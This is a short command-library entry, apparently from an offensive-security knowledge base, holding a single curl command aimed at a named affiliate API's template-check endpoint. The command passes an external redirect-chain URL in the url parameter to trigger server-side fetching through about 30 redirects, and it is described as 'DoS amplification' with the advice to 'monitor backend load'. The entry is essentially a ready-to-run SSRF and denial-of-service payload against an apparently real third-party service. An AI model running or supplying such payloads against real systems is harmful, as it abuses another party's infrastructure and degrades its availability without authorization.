---
id: cmd-exness-get-redirect
data: >-
  curl -X GET
  "https://my.exnessaffiliates.com/api/partner_integrations/template/check/?url=https://mandygreencps.com/redir1.html"
tags:
  - ssrf
  - dos
  - redirect
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:14.628Z'
verified: false
validated: true
submitted: true
---
# get-check-redirect-chain

## Command

```bash
curl -X GET "https://my.exnessaffiliates.com/api/partner_integrations/template/check/?url=https://mandygreencps.com/redir1.html"
```

## Description

Tests redirect handling by triggering a chain for DoS amplification.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `url` | Redirect chain endpoint | Yes |

## Examples

### Basic Usage

As above.

## Expected Output

Response after 30 redirects; monitor backend load.

## Related

- [[procedures/Test-Redirect-Handling-for-DoS-Amplification]]
